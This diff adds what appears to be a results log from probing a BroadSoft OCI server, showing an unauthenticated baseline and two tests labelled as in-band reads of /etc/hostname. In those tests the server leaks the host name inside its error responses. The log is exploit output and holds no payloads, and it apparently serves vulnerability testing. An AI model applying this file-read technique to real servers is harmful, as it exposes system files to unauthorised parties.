@@ -1,0 +1,25 @@
+### T1 baseline (plain, unauthenticated)
+=== mode=plain target=192.168.188.x:2208 tls=False len=312 ===
+[bytes] 410
+[response-begin]
+<?xml version="1.0" encoding="UTF-8"?><BroadsoftDocument xmlns="C" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" protocol="OCI"><sessionId xmlns="">probesess0001</sessionId><command xmlns="" xmlns:c="C" type="Error" xsi:type="c:ErrorResponse"><summary>[Error 5404] Unauthorized transaction.</summary><summaryEnglish>[Error 5404] Unauthorized transaction.</summaryEnglish></command></BroadsoftDocument>
+
+[response-end]
+
+### T2 in-band read of /etc/hostname (2208)
+=== mode=band target=192.168.188.x:2208 tls=False len=381 ===
+[bytes] 413
+[response-begin]
+<?xml version="1.0" encoding="UTF-8"?><BroadsoftDocument xmlns="C" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" protocol="OCI"><sessionId xmlns="">202606.bwas.com
+</sessionId><command xmlns="" xmlns:c="C" type="Error" xsi:type="c:ErrorResponse"><summary>[Error 5404] Unauthorized transaction.</summary><summaryEnglish>[Error 5404] Unauthorized transaction.</summaryEnglish></command></BroadsoftDocument>
+
+[response-end]
+
+### T3 in-band read of /etc/hostname (2209 TLS)
+=== mode=band target=192.168.188.x:2209 tls=True len=381 ===
+[bytes] 413
+[response-begin]
+<?xml version="1.0" encoding="UTF-8"?><BroadsoftDocument xmlns="C" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" protocol="OCI"><sessionId xmlns="">202606.bwas.com
+</sessionId><command xmlns="" xmlns:c="C" type="Error" xsi:type="c:ErrorResponse"><summary>[Error 5404] Unauthorized transaction.</summary><summaryEnglish>[Error 5404] Unauthorized transaction.</summaryEnglish></command></BroadsoftDocument>
+
+[response-end]
